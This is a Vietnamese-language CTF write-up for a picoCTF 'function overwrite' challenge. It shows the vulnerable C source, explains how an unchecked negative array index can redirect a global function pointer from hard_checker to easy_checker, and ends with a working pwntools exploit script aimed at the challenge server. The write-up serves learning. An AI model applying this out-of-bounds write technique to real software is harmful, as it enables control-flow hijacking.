# funtion overwrie

**soucre C:**

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}


```

chall này khá lạ đấy chứ

**tại hàm vuln thì thấy hàm check đang trỏ đến hard_checker**

hàm **hard_checker** thì có thể in flag, yêu cầu là hàm **calculate_story_score trả về 13371337**

hàm **calculate_story_score** thì **lấy từng giá trị trong story cộng dồn vào**

hmm ở đây có 1 vấn đề, giờ chúng ta phân tích nha:

![image](https://github.com/gookoosss/CTF/assets/128712571/880f49fd-f41c-4ffe-b16c-8199383d1aa8)


**hình bảng mã ascii ở trên thì tối đa là 255, story cho phép ta nhập 127 kí tự , tính ra hàm calculate_story_score chỉ có thể trả về tối đa là 32385, ko thể nào trả về được 13371337**

![image](https://github.com/gookoosss/CTF/assets/128712571/cb801f0d-f469-45b5-a686-1bb82a01ae77)


à để ý thì có **hàm easy_checker giống hệt hàm hard_checker** nhưng mà chỉ y**êu cầu calculate_story_score trả về 1337**, nên ta sẽ tập trung vào đây

h ta sẽ tìm địa chỉ fun và check xem sao


![image](https://github.com/gookoosss/CTF/assets/128712571/51fbd4af-ba49-438d-bbb2-1ce6df48f710)


hàm fun và check cách nhau 64byte nên, nếu ta cho fun lùi lại 16 stack thì sẽ đến check ,mỗi stack 4byte, 64 / 4 = 16 **nên tại num1 ta sẽ nhập -16**


![image](https://github.com/gookoosss/CTF/assets/128712571/cf04ac50-e024-48a8-b30f-536426407b95)


lúc này **fun[-16] sẽ là hàm check** , mà check đang trỏ đến hard_checker **nên ta cần tính offset từ hard_checker đến easy_checker rồi nhập vào num2 là -314**

**tóm tắt:**
```
fun[-16] == check()
check => hard_checker
check - 314 => hard_checker - 314 == easy_checker
```

![image](https://github.com/gookoosss/CTF/assets/128712571/69924619-13b0-4c01-a8e8-8d3e21d407bb)


à ta cần cái story để calculate_story_score trả về 1337, **vậy ta sẽ nhập 13 chữ a và 1 chữ L là aaaaaaaaaaaaaL**

![image](https://github.com/gookoosss/CTF/assets/128712571/59b8a660-f2ef-4a9e-a148-4057ecec4b5c)


**script:**

```python

#!/usr/bin/python3

from pwn import *

context.binary = exe =ELF('./vuln',checksec=False)

#p = process(exe.path)
p = remote('saturn.picoctf.net', 53550)

check = 0x804c040
fun = 0x804c080
#offset = 64
easy_checker = 0x80492fc
hard_checker = 0x8049436
#offset = 314

payload = b'aaaaaaaaaaaaaL'

p.sendlineafter(b'>> ',payload)

payload = b'-16 -314'

p.sendlineafter(b'10.',payload)

p.interactive()

```







